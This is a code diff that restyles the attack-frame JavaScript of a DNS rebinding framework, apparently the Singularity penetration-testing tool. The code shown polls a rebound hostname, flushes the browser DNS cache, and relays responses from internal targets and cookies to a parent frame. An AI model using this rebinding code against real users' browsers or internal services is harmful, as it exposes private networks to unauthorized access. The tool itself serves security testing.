@@ -7,44 +7,41 @@ const Rebinder = () => {
     let rebindingDoneFn = null;
 
     let timer = null;
-    var frame = null;
-    var sessionid = null;
-    var flushdns = null;
-    let xhr = null;
+
     let payload = null;
     let interval = 60000;
     let wsproxyport = 3129;
 
     function initCommsWithParentFrame() {
-        window.addEventListener("message", function (e) {
-            console.log("attack frame", window.location.hostname, "received message", e.data.cmd);
+        window.addEventListener('message', function (e) {
+            console.log('attack frame', window.location.hostname, 'received message', e.data.cmd);
 
             switch (e.data.cmd) {
-                case "payload":
+                case 'payload':
                     payload = e.data.param;
                     break;
-                case "interval":
+                case 'interval':
                     interval = parseInt(e.data.param) * 1000;
                     break;
-                case "indextoken":
+                case 'indextoken':
                     indextoken = e.data.param;
                     break;
-                case "wsproxyport":
+                case 'wsproxyport':
                     wsproxyport = e.data.param;
                     break;
-                case "flushdns":
+                case 'flushdns':
                     if (e.data.param.flushDns === true) {
-                        console.log("Flushing Browser DNS cache.");
+                        console.log('Flushing Browser DNS cache.');
                         flushBrowserDnsCache(e.data.param.hostname);
                     }
                     break;
-                case "stop":
+                case 'stop':
                     clearInterval(timer);
                     break;
-                case "start":
+                case 'start':
                     timer = setInterval(function () { run() }, interval);
-                    console.log("frame", window.location.hostname, "waiting", interval,
-                        "milliseconds for dns update");
+                    console.log('frame', window.location.hostname, 'waiting', interval,
+                        'milliseconds for dns update');
                     break;
             }
         });
@@ -55,7 +52,7 @@ const Rebinder = () => {
         rebindingDoneFn = myRebindingDoneFn;
         initCommsWithParentFrame();
         window.parent.postMessage({
-            status: "start"
+            status: 'start'
         }, "*");
     };
 
@@ -79,7 +76,6 @@ const Rebinder = () => {
                 };
 
                 return r.text();
-
             })
             .then(function (responseData) { // we successfully received the server response
                 if (responseData.length === 0) {
@@ -96,7 +92,7 @@ const Rebinder = () => {
                 clearInterval(timer); // stop the attack timer
                 // Report success to parent frame
                 window.parent.postMessage({
-                    status: "success",
+                    status: 'success',
                     response: body
                 }, "*");
                 // Terminate the attack
@@ -106,9 +102,9 @@ const Rebinder = () => {
             })
             .catch(function (error) {
                 if (error instanceof TypeError) { // We cannot establish an HTTP connection
-                    console.log("frame " + window.location.hostname + " could not load: " + error);
+                    console.log('frame ' + window.location.hostname + ' could not load: ' + error);
                     window.parent.postMessage({
-                        status: "error",
+                        status: 'error',
                     }, "*");
                 } else if (error.message === 'hasSingularityHeader' ||
                     error.message === 'invalidResponseLength' ||
@@ -117,13 +113,13 @@ const Rebinder = () => {
                 } else if (error.message == 'requiresHttpAuthentication') {
                     console.log('This resource requires HTTP Authentication.');
                     window.parent.postMessage({
-                        status: "requiresHttpAuthentication",
+                        status: 'requiresHttpAuthentication',
                     }, "*");
                     rebindingDoneFn(payload, headers, cookie, null);
                 } else { // We did not handle something
                     console.log('Unhandled error: ' + error);
                     window.parent.postMessage({
-                        status: "error",
+                        status: 'error',
                     }, "*");
                 }
             });
@@ -132,7 +128,6 @@ const Rebinder = () => {
     return {
         init,
         run,
-
     }
 }
 
@@ -140,7 +135,7 @@ function timeout(ms, promise, controller) {
     return new Promise(function (resolve, reject) {
         setTimeout(function () {
             controller.abort();
-            reject(new Error("timeout"))
+            reject(new Error('timeout'))
         }, ms)
         promise.then(resolve, reject)
     })
@@ -149,7 +144,7 @@ function timeout(ms, promise, controller) {
 function begin(url) {
     const hostnameEl = document.getElementById('hostname');
     const arr = window.location.hostname.split('-');
-    const port = document.location.port ? document.location.port : "80";
+    const port = document.location.port ? document.location.port : '80';
     hostnameEl.innerText = `target: ${arr[2]}:${port}, session: ${arr[3]}, strategy: ${arr[4]}`;
     r = Rebinder();
     r.init(url, attack);
@@ -237,24 +232,24 @@ function webSocketHook(initialCookie, wsProxyPort, retry) {
 }
 
 function buildCookie(val, days) {
-    var expires = "";
+    let expires = "";
     if (days) {
         let date = new Date();
         date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
-        expires = "; expires=" + date.toUTCString();
+        expires = '; expires=' + date.toUTCString();
     }
     return `${val} ${expires} ; path=/`;
 }
 
 function getCookies() {
-    return document.cookie === "" ? [] : document.cookie.split(';').map(x => x.trim());
+    return document.cookie === '' ? [] : document.cookie.split(';').map(x => x.trim());
 
 }
 
 function responseOKOrFail(errorString) {
     return function (r) {
         if (r.ok) {
-            console.log("attack frame ", window.location.hostname, " received a response");
+            console.log('attack frame ', window.location.hostname, ' received a response');
             return r.text()
         } else {
             throw new Error(errorString)
